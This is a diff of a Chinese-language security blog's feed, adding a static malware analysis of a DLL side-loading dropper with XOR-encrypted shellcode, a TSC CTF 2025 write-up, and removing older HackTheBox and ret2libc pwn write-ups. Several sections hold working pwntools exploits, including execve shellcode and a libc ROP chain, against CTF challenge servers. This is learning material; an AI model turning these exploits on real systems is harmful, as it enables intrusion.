+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SkL8Jmb81e.png"
+                      alt="image"
+                ></li>
+<li>Grep dll<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJUZecFHyg.png"
+                      alt="image"
+                ></li>
+</ul>
+<h4 id="DIE"><a href="#DIE" class="headerlink" title="DIE"></a>DIE</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SkZy39Z81l.png"
+                      alt="image"
+                ></p>
+<ul>
+<li>AMD64 PE</li>
+<li>Develop with Vistual C&#x2F;C++</li>
+<li>Without packing</li>
+</ul>
+<h4 id="Import"><a href="#Import" class="headerlink" title="Import"></a>Import</h4><p>Kernel32.dll<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/r147djZU1l.png"
+                      alt="image"
+                ></p>
+<p>這邊可以看到跟 grep dll 的結果不太一樣，可以推測這支程式內還藏了一些東西</p>
+<h3 id="Decompile"><a href="#Decompile" class="headerlink" title="Decompile"></a>Decompile</h3><ul>
+<li><p>Entry point -&gt; <code>Optional header :: Entry Point + image base</code><br>  jmp to Entry point<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkJ1eobI1l.png"
+                      alt="image"
+                ><br>Security and CRT init</p>
+</li>
+<li><p>回到Function <code>main</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Hk6wfoZ81l.png"
+                      alt="image"
+                ><br>會看到call 了同一個 Function 暫時命名為 load_resource</p>
+</li>
+</ul>
+<h4 id="Load-resource"><a href="#Load-resource" class="headerlink" title="Load_resource ?"></a>Load_resource ?</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BkpvQsZ81x.png"
+                      alt="image"
+                ></p>
+<p>所以這邊不是 <code>load_resource</code> 是 <code>saveResourceToPath</code> 才對<br>可以知道他從 resourcee drop 兩個 file lpName分別是</p>
+<ul>
+<li>101</li>
+<li>102</li>
+</ul>
+<h4 id="Drop-file-execution"><a href="#Drop-file-execution" class="headerlink" title="Drop file execution"></a>Drop file execution</h4><p>使用 <code>winexec</code> 執行<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BykieYBLyx.png"
+                      alt="image"
+                ></p>
+<h2 id="What-about-Drop-File"><a href="#What-about-Drop-File" class="headerlink" title="What about Drop File"></a>What about Drop File</h2><ul>
+<li><p>原程式的 .rsrc<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJYz05bLkx.png"
+                      alt="image"
+                ></p>
+</li>
+<li><p>ResourceHacker Extract File<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJWw2FWLJx.png"
+                      alt="image"
+                ><br>這邊把 DLL and EXE 都存起來</p>
+</li>
+</ul>
+<p>check file hash 就可以知道 exe 是正常的，但 dll 可能是惡意的</p>
+<p><a class="link"   href="https://www.virustotal.com/gui/file/e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46" >EXE<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   href="https://www.virustotal.com/gui/file/82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732" >DLL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Export-and-Import"><a href="#Export-and-Import" class="headerlink" title="Export and Import"></a>Export and Import</h3><ul>
+<li>DLL Export<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkg4BsmI1e.png"
+                      alt="image"
+                ></li>
+<li>EXE Import<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ryjSUjX8Je.png"
+                      alt="image"
+                ></li>
+</ul>
+<p>這邊的 import 可以看到他用了 McVsocCfg.dll 的 McVsoCfgGetObject ，所以先看這個 function</p>
+<h4 id="McVsoCfgGetObject"><a href="#McVsoCfgGetObject" class="headerlink" title="McVsoCfgGetObject"></a>McVsoCfgGetObject</h4><ul>
+<li><code>unk_1800159F0</code> 做 XOR 解密<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HkDT89WIke.png"
+                      alt="image"
+                ></li>
+</ul>
+<p>下個部分就是 VirtualAlloc and memmove 解密後的 unk_1800159F0</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJWY-5W81e.png"
+                      alt="image"
+                ></p>
+<ul>
+<li>VirtualAlloc : 分配 VM</li>
+<li>memmove :  將 unk_1800159F0 指向的 block copy 到 VirtualAlloc 的 block</li>
+<li>一段 XOR 解密過的資料被載入 VM</li>
+</ul>
+<p><code>unk_1800159F0 -&gt; shellcode</code></p>
+<h3 id="Conculsion"><a href="#Conculsion" class="headerlink" title="Conculsion"></a>Conculsion</h3><ul>
+<li>.rsrc 段內植入 合法的 exe 及 惡意的DLL</li>
+<li>Drop File <code>DLL side-loading</code><br>  但我們還看不出來他到底做了什麼(因為shellcode 做 XOR)，可以用動態分析看</li>
+</ul>
+<h2 id="VT"><a href="#VT" class="headerlink" title="VT"></a>VT</h2><p><a class="link"   href="https://www.virustotal.com/gui/file/d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca" >VT Check<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+      <tags>
+        <tag>Research</tag>
+        <tag>Malware</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NTTU 伺服器原理 WriteUp</title>
     <url>/2024/08/06/server/</url>
     <content><![CDATA[<ol>
@@ -2404,46 +2550,89 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox CTF Try Out - pwn</title>
-    <url>/2024/12/10/htb-ctf/</url>
-    <content><![CDATA[<h2 id="HackTheBox-CTF-Try-Out"><a href="#HackTheBox-CTF-Try-Out" class="headerlink" title="HackTheBox CTF Try Out"></a>HackTheBox CTF Try Out</h2><p>HackTheBox 平台上的新手導向 CTF</p>
-<p><a class="link"   href="https://ctf.hackthebox.com/event/details/ctf-try-out-1434" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Regularity"><a href="#Regularity" class="headerlink" title="Regularity"></a>Regularity</h3><p>這題的 read function 中有一個 overflow<br>因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 <code>jmp rsi</code> gadget 就會跳到寫入 shellcode 的地方</p>
+    <title>TSC CTF 2025 WriteUP</title>
+    <url>/2025/01/27/tscctf2025/</url>
+    <content><![CDATA[<h2 id="TSC-CTF-2025"><a href="#TSC-CTF-2025" class="headerlink" title="TSC CTF 2025"></a>TSC CTF 2025</h2><h3 id="gamble-bad-bad"><a href="#gamble-bad-bad" class="headerlink" title="gamble_bad_bad"></a>gamble_bad_bad</h3><p>check jackpot_value &#x3D;&#x3D; 777</p>
+<p>蓋掉 buf[20]  777 -&gt; jackpot_value</p>
+<p>exp : <code>aaaaaaaaaaaaaaaaaaaa777</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HyVWiVfw1l.png"
+                      alt="image"
+                ></p>
+<h3 id="What-Happened"><a href="#What-Happened" class="headerlink" title="What_Happened"></a>What_Happened</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BkFufBMDJl.png"
+                      alt="image"
+                ></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">encrypted_flag = [</span><br><span class="line">    <span class="number">0xFE</span>, <span class="number">0xF9</span>, <span class="number">0xE9</span>, <span class="number">0xD1</span>, <span class="number">0xE3</span>, <span class="number">0xF5</span>, <span class="number">0xFE</span>, <span class="number">0xC2</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0xC1</span>, <span class="number">0xF5</span>, </span><br><span class="line">    <span class="number">0xD3</span>, <span class="number">0xC5</span>, <span class="number">0xDF</span>, <span class="number">0xF5</span>, <span class="number">0xEC</span>, <span class="number">0xC3</span>, <span class="number">0xD2</span>, <span class="number">0xF5</span>, <span class="number">0x98</span>, <span class="number">0xC5</span>, <span class="number">0xC7</span>, <span class="number">0xCF</span>, </span><br><span class="line">    <span class="number">0xF5</span>, <span class="number">0x99</span>, <span class="number">0xD8</span>, <span class="number">0xD8</span>, <span class="number">0xC5</span>, <span class="number">0xD8</span>, <span class="number">0xD7</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR with 0xAA to decrypt</span></span><br><span class="line">decrypted_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(byte ^ <span class="number">0xAA</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted Flag: <span class="subst">&#123;decrypted_flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>TSC{I_Think_you_Fix_2ome_3rror}</p>
+<h3 id="Chill-checker"><a href="#Chill-checker" class="headerlink" title="Chill_checker"></a>Chill_checker</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_transform</span>(<span class="params">a1</span>):</span><br><span class="line">    original_a1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):  <span class="comment"># Loop for each character</span></span><br><span class="line">        current_char = <span class="built_in">ord</span>(a1[i]) - <span class="number">65</span>  <span class="comment"># Convert to 0-based index</span></span><br><span class="line">        shift = (<span class="number">31</span> * (i + <span class="number">8</span>)) % <span class="number">26</span>  <span class="comment"># Calculate shift</span></span><br><span class="line">        original_index = (current_char - shift) % <span class="number">26</span>  <span class="comment"># Reverse shift, wrap within 0-25</span></span><br><span class="line">        original_char = <span class="built_in">chr</span>(original_index + <span class="number">65</span>)  <span class="comment"># Convert back to ASCII</span></span><br><span class="line">        original_a1.append(original_char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(original_a1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given transformed a1</span></span><br><span class="line">transformed_a1 = <span class="string">&quot;SGZIYIHW&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original a1:&quot;</span>, reverse_transform(transformed_a1))</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>ENBFQVPZ</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJbv-jQD1e.png"
+                      alt="截圖 2025-01-14 16.33.24"
+                ></p>
+<h3 id="localstack"><a href="#localstack" class="headerlink" title="localstack"></a>localstack</h3><p>看 Stack 大概是<code>oob</code></p>
+<p>pop , push 40 會出現<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SyqafM-dJe.png"
+                      alt="截圖 2025-01-24 21.16.47"
+                ></p>
 <ul>
-<li>read function disassemble</li>
+<li><code>xinfo 93824992247152</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJvr4Mb_kl.png"
+                      alt="截圖 2025-01-24 21.23.04"
+                ></li>
 </ul>
+<p>可以看到這邊定位到 <code>__do_global_dtors_aux</code></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HJEwKiBNkx.png"
-                      alt="images"
+                     data-src="https://hackmd.io/_uploads/HyceFMb_Jx.png"
+                      alt="截圖 2025-01-24 21.43.03"
                 ></p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;94.237.53.5&#x27;</span>,<span class="number">59584</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sc =  asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rax ,rax</span></span><br><span class="line"><span class="string">        mov rbx , 0x68732F6E69622F</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea    rsi,[rsp]</span></span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line"></span><br><span class="line">p = flat(sc, <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x100</span>-<span class="built_in">len</span>(sc)),jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag.*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="為什麼是塞-0x100-不是-0x108"><a href="#為什麼是塞-0x100-不是-0x108" class="headerlink" title="為什麼是塞 0x100 不是 0x108"></a>為什麼是塞 0x100 不是 0x108</h4><p>這支程式在 function prologue&amp;Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。</span><br><span class="line">現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。</span><br><span class="line">這種方法叫做 frame pointer omission (FPO)。</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Abyss"><a href="#Abyss" class="headerlink" title="Abyss"></a>Abyss</h3><blockquote>
-<p>not yet</p>
-</blockquote>
-<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><ul>
-<li>比對字串後有一個 <code>fgets</code>的 overflow 跳到 <code>escape_plan()</code> 就會輸出 flag</li>
-</ul>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.62.166&quot;</span> , <span class="number">45685</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> +p64(<span class="number">0x401256</span>) <span class="comment"># push rbp 後面</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;69&#x27;</span>) <span class="comment"># 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
+<p>這邊 leak address 就可以算出 process 的 base address</p>
+<ol>
+<li><p>繼續 pop stack 可以看到他慢慢的往 低位置移動<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/SJEno0BZ1g.png"
-                      alt="images"
+                     data-src="https://hackmd.io/_uploads/BJVBaEWuyx.png"
+                      alt="image"
                 ></p>
-<h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><blockquote>
-<p>ret2dl_resolve</p>
-</blockquote>
+</li>
+<li><p>多 pop 幾次就會到 ret function 了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJdY0V-Oyl.png"
+                      alt="截圖 2025-01-25 00.23.19"
+                ></p>
+</li>
+<li><p>最後再依序 push ret , print_flag 的 address 就可以bypass canary 跳到 print_flag function 去<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1Gd3B-OJx.png"
+                      alt="截圖 2025-01-25 01.22.42"
+                ></p>
+</li>
+</ol>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><figcaption><span>Exploit</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./localstack&quot;)</span></span><br><span class="line">r= remote(<span class="string">&quot;172.31.1.2&quot;</span>, <span class="number">11100</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;pop&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;push 40&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;show&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 64</span></span><br><span class="line"><span class="comment"># main+472</span></span><br><span class="line"><span class="comment"># /root/pwn/tsc/localstack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print_flag 0x1289</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Stack top: &quot;</span>)</span><br><span class="line"></span><br><span class="line">pie = <span class="built_in">int</span>(r.recvline().strip())- <span class="number">0x3d70</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;Base Address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">flag = pie + <span class="number">0x1289</span></span><br><span class="line">ret = pie + <span class="number">0x15a1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;pop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">f&quot;push <span class="subst">&#123;<span class="built_in">str</span>(ret)&#125;</span>&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">f&quot;push <span class="subst">&#123;<span class="built_in">str</span>(flag)&#125;</span>&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>TSC{1_g07_0_point_1n_D474_57ruc7ur3_d0_U_hAv3_anY_1d3a?_haha}</p>
+<h2 id="Src"><a href="#Src" class="headerlink" title="Src"></a>Src</h2><p><a class="link"   href="https://github.com/pwn2ooown/My-CTF-Challenges-Public/tree/main/2025_TSCCTF" >pwn2ooown<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 ]]></content>
       <tags>
-        <tag>HTB</tag>
-        <tag>pwn</tag>
         <tag>CTF</tag>
       </tags>
   </entry>
@@ -2509,60 +2698,7 @@ Pwnable.tw</p>
         <category>PWN</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Wireguard VPN</title>
-    <url>/2024/07/31/wireguard/</url>
-    <content><![CDATA[<h2 id="Setup-wireguard-VPN"><a href="#Setup-wireguard-VPN" class="headerlink" title="Setup wireguard VPN"></a>Setup wireguard VPN</h2><blockquote>
-<p>要先有一台機器</p>
-<blockquote>
-<p>租個雲服務都可以，這邊推薦 <a class="link"   href="https://linode.com/" >Linode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-</blockquote>
-</blockquote>
-<p><code>sudo apt install wireguard</code></p>
-<p><a class="link"   href="https://www.wireguard.com/install/" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>推薦使用<a class="link"   href="https://www.wireguardconfig.com/" >這個<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>生config檔 (我就懶👍)</p>
-<blockquote>
-<p>不然要用 <code>wg</code> 生Server,Client 的 private&#x2F;public key 然後寫conf</p>
-</blockquote>
-<p>把 Server File 丟進 <code>/etc/wireguard/wg0.conf</code> 後 <code>wg-quick up wg0</code><br>client File 丟進 app</p>
-<p>就行了💯</p>
-<p>這個改定位沒什麼用，只能改ip所以有GPS驗證的可能沒辦法跳過</p>
-]]></content>
-      <tags>
-        <tag>vpn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NCKUCTF ret2libc2024 WriteUp</title>
-    <url>/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/</url>
-    <content><![CDATA[<h2 id="ret2lbic2024"><a href="#ret2lbic2024" class="headerlink" title="ret2lbic2024"></a>ret2lbic2024</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can you exploit buffer overflow in 2024?&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<blockquote>
-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#x74;&#x64;&#111;&#117;&#116;&#64;&#71;&#76;&#73;&#66;&#x43;&#x5f;&#50;&#46;&#50;&#46;&#x35;" >&#x73;&#x74;&#x64;&#111;&#117;&#116;&#64;&#71;&#76;&#73;&#66;&#x43;&#x5f;&#50;&#46;&#50;&#46;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/rop4-detmclone.png"
-                      alt="image"
-                ></p>
-<hr>
-<ul>
-<li>在leak的時候需要注意不能把<code>$rbp</code>寫壞，因為下次<code>gets()</code>還需要一個stack空間存東西，所以隨便找一個可寫的空間給<code>$rbp</code>跳過去後面才不會crash掉。</li>
-<li>為什麼 offset 不是用 <code>stdout@@GLIBC_2.2.5</code><br>  <code>stdout@@GLIBC_2.2.5</code> 是一個指向 <code>_IO_2_1_stdout_</code> 結構的指標，而 <code>_IO_2_1_stdout_</code> 是實際的 FILE 結構體。<br>  使用 <code>_IO_2_1_stdout_</code> 可以直接操作該結構體的memory，而不是通過指標間接訪問它。這樣可以避免偏移計算中的錯誤，也可以更精確地控制內存中的值。</li>
-</ul>
-<hr>
-<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./chal&#x27;)</span></span><br><span class="line">r= remote(<span class="string">&#x27;140.116.246.190&#x27;</span>,<span class="number">8789</span>)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf 在設定rdi時 是用 mov rdi, rax</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">detmclone = <span class="number">0x4010d0</span> <span class="comment"># 會把rax設成 stdout</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x4011c5</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    bss,</span><br><span class="line">    ret,</span><br><span class="line">    detmclone,</span><br><span class="line">    mov_rdi_rax</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2024?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stdout -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.symbols[<span class="string">&#x27;stdout&#x27;</span>]))</span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21A780</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base address -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address)) </span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45eb0</span></span><br><span class="line">pop_rdx_rbx = l.address + <span class="number">0x90529</span></span><br><span class="line">syscall = l.address + <span class="number">0x29db4</span></span><br><span class="line">sh = l.address + <span class="number">0x1D8698</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;sh: %s&quot;</span> % <span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sh,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    ret,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>PWN</category>
-      </categories>
-      <tags>
         <tag>pwn</tag>
       </tags>
   </entry>
@@ -2723,6 +2859,45 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
+    <title>Wireguard VPN</title>
+    <url>/2024/07/31/wireguard/</url>
+    <content><![CDATA[<h2 id="Setup-wireguard-VPN"><a href="#Setup-wireguard-VPN" class="headerlink" title="Setup wireguard VPN"></a>Setup wireguard VPN</h2><blockquote>
+<p>要先有一台機器</p>
+<blockquote>
+<p>租個雲服務都可以，這邊推薦 <a class="link"   href="https://linode.com/" >Linode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+</blockquote>
+<p><code>sudo apt install wireguard</code></p>
